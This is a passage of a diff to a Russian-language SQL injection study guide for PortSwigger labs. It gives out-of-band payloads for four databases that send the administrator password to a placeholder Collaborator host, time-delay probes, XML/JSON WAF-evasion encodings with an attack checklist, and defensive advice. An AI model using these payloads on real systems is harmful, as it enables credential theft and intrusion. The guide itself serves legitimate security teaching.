-x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.твой_поддомен.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--
-#### PostgreSQL (через dblink)
-'||dblink('host='||(SELECT password FROM users WHERE username='administrator')||'.твой_поддомен.burpcollaborator.net', 'SELECT 1')||'<br>
-#### MySQL (через LOAD_FILE)
-' AND LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users WHERE username='administrator'), '.твой_поддомен.burpcollaborator.net', '\\a'))--<br>
+**Последний рубеж.** Когда не работает ничего: нет ошибок, нет изменений, нет задержек.
 
-## 📋 Как понять, какая СУБД
-Если ты не знаешь СУБД, проверь через задержки:
+**Идея:** заставляем сервер БД отправить **внешний DNS/HTTP-запрос** на наш подконтрольный сервер (Burp Collaborator). Если запрос пришёл — уязвимость есть, и в поддомен можно засунуть данные.
 
-| СУБД       | Команда для задержки (10 секунд)          | Примечание                                |
-|------------|-------------------------------------------|-------------------------------------------|
-| **MSSQL**  | `WAITFOR DELAY '0:0:10'`                  | Формат: `'HH:MI:SS'`                      |
-| **Oracle** | `DBMS_PIPE.RECEIVE_MESSAGE('x', 10)`      | Параметр — секунды                        |
-| **PostgreSQL** | `pg_sleep(10)`                         | Аргумент — секунды                        |
-| **MySQL**  | `SLEEP(10)`                               | Аргумент — секунды                        |
+**Инструменты:**
+- **Burp Collaborator** (в Burp Suite Pro) — то, что нужно для лабораторий PortSwigger.
+- Interactsh, oastify.com — альтернативы, но **не работают** в лабораториях PortSwigger.
 
-### 💡 Важные нюансы
-В лабораториях PortSwigger используй только Collaborator-адрес, сгенерированный через Copy to clipboard в Burp. Сторонние сервисы (Interactsh, oastify.com) блокируются.<br>
+#### Шаг 1. Проверка (безусловный запрос)
 
-Если лаборатория не срабатывает, но Collaborator получает запросы — иногда система засчитывает решение автоматически, даже если ты не видишь данные в Collaborator (проверь статус лаборатории).<br>
+**MSSQL:**
+```sql
+'; exec master..xp_dirtree '//твой.burpcollaborator.net/a'--
+```
 
-Для эксфильтрации данных убедись, что ты используешь правильные имена таблиц и столбцов (в лабораториях обычно users, username, password).<br>
+**Oracle:**
+```sql
+'||UTL_INADDR.GET_HOST_ADDRESS('твой.burpcollaborator.net')||'
+```
 
-### Полезные ссылки<br>
-PortSwigger SQL Injection Cheat Sheet — раздел с OAST-методами.**(https://portswigger.net/web-security/sql-injection/cheat-sheet)** <br>
+**PostgreSQL:**
+```sql
+'||dblink('host=твой.burpcollaborator.net user=test dbname=test', 'SELECT 1')||'
+```
 
-Шпаргалка по OAST для разных СУБД — репозиторий с пейлоадами.**(https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)** <br>
+**MySQL:**
+```sql
+' AND LOAD_FILE(CONCAT('\\\\', 'твой.burpcollaborator.net', '\\a'))--
+```
 
-### 📌 Запомни
-**OAST — это последний рубеж, когда всё остальное не работает. Если ты умеешь отправлять DNS-запросы через SQL, ты можешь обойти почти любую защиту.**
-</details>
-<details>
-<summary><b>🛡️ 6. Как обойти WAF с помощью кодирования?</b></summary>
-**где можно внедрять?<br>
-Не только в параметрах URL! Любые данные, которые попадают в SQL-запрос:** <br>
-- Параметры строки запроса (?id=1)
-- Тело POST-запроса (формы, JSON, XML)
-- Заголовки HTTP (User-Agent, Cookie)
-- Загружаемые файлы (имена, метаданные)
-- WebSocket-сообщения
+Если в Collaborator пришёл DNS-запрос → ✅ работает.
 
-**WAF ищут запрещённые слова: SELECT, UNION, INSERT, DROP и т.д. Обход — закодировать одну или несколько букв так, чтобы WAF не узнал слово, а сервер раскодировал перед выполнением.**
+#### Шаг 2. Эксфильтрация данных
 
-### XML-кодирование (числовые сущности)
-Символ	Код	Пример
-S	&#x53;	&#x53;ELECT
-U	&#x55;	&#x55;NION
-F	&#x46;	&#x46;ROM
-'	&apos; или &#x27;	username || &apos;~&apos; || password
-### Пример payload в XML:
+**MSSQL:**
+```sql
+'; declare @p varchar(1024); set @p=(SELECT password FROM users WHERE username='administrator'); exec('master..xp_dirtree "//'+@p+'.твой.burpcollaborator.net/a"')--
+```
+
+**Oracle:**
+```sql
+'||UTL_INADDR.GET_HOST_ADDRESS((SELECT password FROM users WHERE username='administrator')||'.твой.burpcollaborator.net')||'
+```
+
+**PostgreSQL:**
+```sql
+'||dblink('host='||(SELECT password FROM users WHERE username='administrator')||'.твой.burpcollaborator.net', 'SELECT 1')||'
+```
+
+**MySQL:**
+```sql
+' AND LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users WHERE username='administrator'), '.твой.burpcollaborator.net', '\\a'))--
+```
+
+#### 📋 Быстрая проверка СУБД через задержки
+
+| СУБД | Команда задержки 10 сек |
+|---|---|
+| MSSQL | `WAITFOR DELAY '0:0:10'` |
+| Oracle | `DBMS_PIPE.RECEIVE_MESSAGE('x', 10)` |
+| PostgreSQL | `pg_sleep(10)` |
+| MySQL | `SLEEP(10)` |
+
+---
+
+## 🛡️ 6. Обход WAF через кодирование
+
+**WAF** (Web Application Firewall) ищет запрещённые слова: `SELECT`, `UNION`, `FROM` и т.д. Обход — **закодировать** часть букв так, чтобы WAF не узнал слово, но сервер раскодировал его перед SQL.
+
+### 📍 Куда можно внедрять?
+- Параметры URL (`?id=1`)
+- Тело POST (формы, JSON, XML)
+- HTTP-заголовки (`User-Agent`, `Cookie`)
+- Имена загружаемых файлов
+- Сообщения WebSocket
+
+### 🔢 XML-кодирование (числовые сущности)
+
+| Символ | Код |
+|---|---|
+| S | `&#x53;` |
+| U | `&#x55;` |
+| F | `&#x46;` |
+| ' | `&apos;` или `&#x27;` |
+
+**Пример payload в XML:**
+```xml
 <storeId>1 &#x55;NION &#x53;ELECT username || &apos;~&apos; || password &#x46;ROM users--</storeId>
-### JSON-кодирование (Unicode)
-Символ	Код	Пример
-S	\u0053	\u0053ELECT
-U	\u0055	\u0055NION
-### Пример payload в JSON:
-{"storeId": "1 \u0055NION \u0053ELECT username FROM users"}<br>
-### Hackvertor (для Burp Suite) <br>
-Установи расширение Hackvertor, тогда можно писать понятный код внутри тегов:<br>
-<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users</@hex_entities></storeId><br>
-Hackvertor сам закодирует все буквы в hex-сущности.<br>
+```
 
-### 📋 Пошаговый чек-лист для атаки через XML
-Перехвати запрос (Burp Suite) — найдите POST с XML-телом.<br>
-Определи место вставки — обычно внутри тега, например <storeId>.<br>
-Проверь количество столбцов — используй UNION SELECT NULL, NULL, ... пока не получишь ответ без ошибок.<br>
-Кодируй ключевые слова — замени первые буквы U и S на &#x55; и &#x53;.<br>
-Вставь payload и отправь.<br>
-Если ответ содержит данные — атака удалась.<br>
-</details>
-<details>
-<summary><b>🛡️ 7. Как защититься?</b></summary>
+### 🅰️ JSON-кодирование (Unicode)
 
-# Рекомендации по защите от SQL-инъекций
+| Символ | Код |
+|---|---|
+| S | `\u0053` |
+| U | `\u0055` |
 
-| ✅ Что делать | ❌ Что нельзя делать |
-|---------------|----------------------|
-| Использовать параметризованные запросы (Prepared Statements) для всех значений (WHERE, INSERT, UPDATE).<br>Для динамических частей (имена таблиц, столбцов, ORDER BY) применять белый список разрешённых значений.<br>Использовать ORM-библиотеки, которые автоматически экранируют параметры.<br>Проводить регулярные проверки безопасности кода. | Никогда не вставлять пользовательский ввод напрямую в строку запроса через конкатенацию.<br>Не пытаться экранировать вручную — легко ошибиться.<br>Не доверять данным, даже если они пришли из JSON/XML.<br>Не полагаться только на WAF — он может быть обойдён. |
+```json
+{"storeId": "1 \u0055NION \u0053ELECT username FROM users"}
+```
 
-### ⚠️ Важно помнить
-- Параметризованные запросы защищают только значения, но не структуру запроса (имена таблиц/колонок, ORDER BY, операторы).
-- Если нельзя использовать параметры — применяйте белый список в коде приложения.
-- Всегда проверяйте, какая СУБД используется: синтаксис может отличаться (|| vs CONCAT, комментарии -- vs #).
+### 🧰 Hackvertor (расширение Burp)
 
-### 🔗 Полезные ресурсы
-PortSwigger Web Security Academy — лабораторные работы.<br>
-Hackvertor — расширение для Burp Suite.<br>
-SQL Injection Cheat Sheet — например, от OWASP.<br>
+Позволяет писать читаемый код, а расширение само кодирует:
+```xml
+<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users</@hex_entities></storeId>
+```
 
-**Главное правило: никогда не доверяйте пользовательскому вводу. Кодируйте, фильтруйте, параметризуйте.**
-</details>
+### ✅ Чек-лист XML-атаки
 
+1. Перехвати запрос в Burp Suite — найди POST с XML.
+2. Определи точку вставки (например, `<storeId>`).
+3. Определи количество колонок через `UNION SELECT NULL, NULL...`
+4. Закодируй ключевые слова (`U`, `S`, `F` → `&#x55;`, `&#x53;`, `&#x46;`).
+5. Отправь и смотри на ответ.
+6. Получил данные → победа. 🏆
 
+---
 
+## 🛡️ 7. Как защититься от SQL-инъекций
 
+### ✅ Что делать
 
+| Мера | Что это даёт |
+|---|---|
+| **Параметризованные запросы (Prepared Statements)** | Значения передаются отдельно от SQL — инъекция невозможна. |
+| **Белый список** для имён таблиц/колонок/ORDER BY | Параметры не защищают структуру — только значения. |
+| **ORM-библиотеки** | Автоматически экранируют данные. |
+| **Регулярные аудиты** | Находят уязвимости до хакеров. |
 
+### ❌ Чего НЕ делать
+- Склеивать пользовательский ввод в строку запроса.
+- Экранировать вручную — легко ошибиться.
+- Доверять JSON/XML «потому что это не URL».
+- Полагаться только на WAF — его обходят.
 
+### ⚠️ Запомни
+- Параметризация защищает **значения**, но не **структуру** (`ORDER BY`, имена таблиц).
+- Разный синтаксис у разных СУБД: `||` vs `CONCAT`, `--` vs `#`.
+- **Главное правило:** никогда не доверяй пользовательскому вводу.
 
+---
 
+### 🎓 Учебные ресурсы
+- **PortSwigger Web Security Academy** — бесплатные лаборатории по SQLi. Начни здесь!
+- **DVWA** (Damn Vulnerable Web App) — можешь развернуть локально.
+- **HackTheBox**, **TryHackMe** — практика в песочнице.
 
+### 🛠️ Инструменты
+- **Burp Suite Community** — перехват запросов, Intruder, Repeater.
+- **sqlmap** — автопентест SQLi (но сначала попробуй руками!).
+- **Hackvertor** — расширение Burp для кодирования.
 
+### 🔗 Шпаргалки
+- [PortSwigger SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
+- [PayloadsAllTheThings — SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
 
+---
 
+## 🧭 Мини-шпаргалка «что куда»
 
+| Ситуация | Что пробовать |
+|---|---|
+| Форма входа | Login Bypass (`admin'--`) |
+| Параметр в URL | UNION, Error-based |
+| Ничего не видно | Boolean → Time → OAST |
+| Есть ошибки | Error-based (CAST) |
+| WAF блокирует | Кодирование (XML/JSON/Hackvertor) |
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+---
